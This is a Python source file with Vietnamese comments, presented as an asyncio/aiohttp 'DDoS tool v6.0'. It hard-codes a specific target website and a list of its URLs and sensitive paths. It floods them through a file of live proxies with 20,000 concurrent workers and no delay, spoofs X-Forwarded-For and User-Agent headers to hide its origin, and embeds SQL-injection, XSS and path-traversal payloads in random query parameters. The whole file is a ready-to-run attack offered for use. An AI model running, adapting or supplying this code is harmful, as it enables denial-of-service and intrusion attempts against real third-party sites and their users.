# -*- coding: utf-8 -*-
# TOOL DDoS SIÊU TỐC v6.0 – ASYNCIO + AIOHTTP – 100K+ REQ/S MỤC TIÊU
# Yêu cầu: pip install aiohttp requests beautifulsoup4
import asyncio
import aiohttp
import random
import time
import os
import sys
import signal
import ssl
import threading
from urllib.parse import urlencode

# ============================================
# CẤU HÌNH CHUNG (CÓ THỂ ĐIỀU CHỈNH)
# ============================================
TARGET_HOST = "www.t4xcheatgamer.x10.mx"
TARGET_PORT = 443

TARGET_URLS = [
    "https://www.t4xcheatgamer.x10.mx/dll_download.php",
    "https://www.t4xcheatgamer.x10.mx/login.php",
    "https://www.t4xcheatgamer.x10.mx/dll_status.php",
]

TARGET_PATHS = [
    "/dll_download.php","/login.php","/dll_status.php","/index.php",
    "/download.php","/wp-admin/","/admin/","/wp-login.php","/api/",
    "/upload.php","/config.php","/.env","/phpinfo.php","/server-status",
]

PROXY_FILE = "proxies_live.txt"  # File chứa proxy sống

# Tối ưu cho tốc độ: số lượng tác vụ đồng thời cực lớn
MAX_CONCURRENT = 20000            # Số kết nối đồng thời tối đa (tùy RAM/CPU)
REQUEST_TIMEOUT = 5               # Timeout mỗi request (ngắn để quay vòng nhanh)
DELAY_BETWEEN_SENDS = 0           # Không chờ giữa các lần gửi (tận dụng tối đa)

# Danh sách headers/bodies giữ nguyên như trước, chỉ rút gọn để không dài
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.68.0","python-requests/2.28.0",
]

REFERERS = ["https://www.google.com/","https://www.bing.com/","https://duckduckgo.com/"]
QUERY_PARAMS = ["file_id","download","token","id","hash","rand","r","t"]
PAYLOADS = ["' OR 1=1--","<script>alert(1)</script>","/etc/passwd","../../"]

# ============================================
# HÀM TẠO URL/HEADERS NGẪU NHIÊN
# ============================================
def random_url():
    base = random.choice(TARGET_URLS)
    if random.random() < 0.3:
        base = f"https://{TARGET_HOST}{random.choice(TARGET_PATHS)}"
    params = {}
    for _ in range(random.randint(1, 10)):
        params[random.choice(QUERY_PARAMS)] = random.choice(PAYLOADS) if random.random() < 0.2 else str(random.randint(1,99999))
    if params:
        base += "?" + urlencode(params)
    return base

def random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
    }

# ============================================
# LỚP TẤN CÔNG ASYNCIO SIÊU TỐC
# ============================================
class AsyncFlood:
    def __init__(self, proxy_file=PROXY_FILE):
        self.proxies = []
        self.load_proxies(proxy_file)
        self.running = False
        self.sent = 0
        self.success = 0
        self.start_time = 0
        self.lock = asyncio.Lock()

    def load_proxies(self, path):
        if os.path.exists(path):
            with open(path, "r") as f:
                self.proxies = [line.strip() for line in f if line.strip() and not line.startswith("socks")]
            print(f"[+] Đã tải {len(self.proxies)} proxy HTTP/HTTPS từ {path}")
        else:
            print(f"[-] File {path} không tồn tại. Cần quét proxy trước!")

    async def fetch(self, session, url, proxy_url):
        try:
            async with session.get(url, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
                                   headers=random_headers(), ssl=False) as resp:
                # Đọc nhanh để giải phóng buffer
                await resp.read()
                async with self.lock:
                    self.success += 1
        except:
            pass

    async def worker(self, session, sem):
        while self.running:
            if not self.proxies:
                await asyncio.sleep(0.1)
                continue
            proxy = random.choice(self.proxies)
            proxy_url = f"http://{proxy}"  # chỉ dùng HTTP proxy cho tốc độ
            url = random_url()
            async with sem:
                await self.fetch(session, url, proxy_url)
                async with self.lock:
                    self.sent += 1
                    if self.sent % 5000 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.sent / elapsed if elapsed > 0 else 0
                        print(f"\r[*] Đã gửi: {self.sent} | Thành công: {self.success} | Tốc độ: {rate:.0f} req/s", end="")

    async def monitor(self):
        while self.running:
            await asyncio.sleep(1)
            async with self.lock:
                elapsed = time.time() - self.start_time
                rate = self.sent / elapsed if elapsed > 0 else 0
                # In ra mỗi giây tốc độ thực tế
                print(f"\r[*] Tốc độ hiện tại: {rate:.0f} req/s | Tổng: {self.sent} | Thành công: {self.success}", end="")

    async def run(self, concurrency=MAX_CONCURRENT):
        if not self.proxies:
            print("[-] Không có proxy! Hãy quét proxy trước (dùng script scan).")
            return
        self.running = True
        self.sent = 0
        self.success = 0
        self.start_time = time.time()
        print(f"[!] Bắt đầu tấn công với {len(self.proxies)} proxy, đồng thời tối đa {concurrency} kết nối")
        print("[!] Nhấn Ctrl+C để dừng.\n")

        # Tạo connector không giới hạn kết nối
        connector = aiohttp.TCPConnector(limit=0, force_close=True, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            sem = asyncio.Semaphore(concurrency)
            workers = [self.worker(session, sem) for _ in range(concurrency)]
            # Chạy monitor song song
            monitor_task = asyncio.create_task(self.monitor())
            await asyncio.gather(*workers)
            monitor_task.cancel()

    def stop(self):
        self.running = False

# ============================================
# HÀM CHÍNH
# ============================================
def main():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║         ASYNC DDoS TOOL v6.0 – MỤC TIÊU 100K REQ/S        ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    flood = AsyncFlood(PROXY_FILE)
    if not flood.proxies:
        print("Bạn cần file proxies_live.txt. Hãy dùng script scan proxy trước.")
        return

    # Chạy với số lượng worker cực lớn
    try:
        asyncio.run(flood.run(concurrency=MAX_CONCURRENT))
    except KeyboardInterrupt:
        print("\n[!] Dừng tấn công.")
        flood.stop()
        elapsed = time.time() - flood.start_time
        print(f"Tổng: {flood.sent} requests trong {elapsed:.1f}s, tốc độ TB: {flood.sent/elapsed:.0f} req/s")

if __name__ == "__main__":
    main()
